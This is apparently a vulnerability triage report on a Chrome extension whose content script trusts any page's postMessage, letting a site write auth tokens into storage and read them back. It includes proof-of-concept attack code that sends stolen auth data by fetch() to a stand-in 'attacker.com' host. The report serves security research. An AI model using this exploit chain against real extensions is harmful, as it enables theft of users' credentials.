# CoCo Analysis: kcgjmjiklcchbhljelchjdpoooccmhcn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 7 (3 storage.set flows + 4 postMessage flows forming complete exploitation chains)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink (data.token)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kcgjmjiklcchbhljelchjdpoooccmhcn/opgen_generated_files/cs_0.js
Line 467: window.addEventListener('message', (event) => {
Line 468: var data = event.data;
Line 475: 'afs-token': data.token,

**Code:**

```javascript
// Content script - cs_0.js (line 467-487)
window.addEventListener('message', (event) => {
  var data = event.data; // ← attacker-controlled

  if (data.direction !== 'from-page') return;

  if (data.hasOwnProperty('setToken')) {
    set(
      {
        'afs-token': data.token, // ← attacker-controlled
        'afs-token-received': data.tokenReceived, // ← attacker-controlled
        'afs-email': data.email // ← attacker-controlled
      },
      () => {
        window.postMessage(
          {
            direction: 'from-content'
          },
          '*'
        );
      }
    );
  }
});

// Line 522-524
function set(data, cb) {
  chrome.storage.local.set(data, cb); // Storage sink
}

// Later in code (line 488-497)
else if (data.hasOwnProperty('getAuthInfo')) {
  get(['afs-token', 'afs-email'], (results) => {
    window.postMessage(
      {
        direction: 'from-content',
        authInfo: results // ← Storage data sent back to webpage
      },
      '*'
    );
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage in content script

**Attack:**

```javascript
// Step 1: Attacker poisons storage from malicious webpage
window.postMessage({
  direction: 'from-page',
  setToken: true,
  token: 'attacker-token',
  tokenReceived: true,
  email: 'attacker@evil.com'
}, '*');

// Step 2: Attacker retrieves poisoned data
window.postMessage({
  direction: 'from-page',
  getAuthInfo: true
}, '*');

// Step 3: Listen for response
window.addEventListener('message', (event) => {
  if (event.data.direction === 'from-content') {
    console.log('Stolen auth data:', event.data.authInfo);
    // Send to attacker server
    fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(event.data.authInfo)
    });
  }
});
```

**Impact:** Complete storage exploitation chain. Attacker can poison authentication tokens and email stored in chrome.storage.local, then retrieve this data back via postMessage. This allows the attacker to manipulate the user's authentication state and exfiltrate stored credentials. The extension only restricts content script injection to afinestart.me domain, but ignores this per the methodology rules.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink (data.tokenReceived)

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1)

**Reason:** Part of the same exploitation chain described in Sink 1.

---

## Sink 3: cs_window_eventListener_message → chrome_storage_local_set_sink (data.email)

**Classification:** TRUE POSITIVE (same vulnerability as Sink 1)

**Reason:** Part of the same exploitation chain described in Sink 1.

---

## Sink 4-7: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
Lines 418-419 show CoCo framework code detecting storage.get → postMessage flow.

**Classification:** TRUE POSITIVE

**Reason:** These flows represent the retrieval side of the complete storage exploitation chain. As shown in Sink 1's attack code, the extension retrieves stored data (including attacker-poisoned data) and sends it back to the webpage via window.postMessage, allowing the attacker to exfiltrate the data they previously stored.

---

## Overall Vulnerability Summary

This extension has a complete bidirectional storage exploitation vulnerability:

1. **Write Path:** Webpage → postMessage → content script → chrome.storage.local.set (attacker poisons storage)
2. **Read Path:** Webpage → postMessage → content script → chrome.storage.local.get → postMessage back to webpage (attacker retrieves poisoned data)

The attacker can both manipulate and exfiltrate authentication tokens and email addresses stored by the extension.
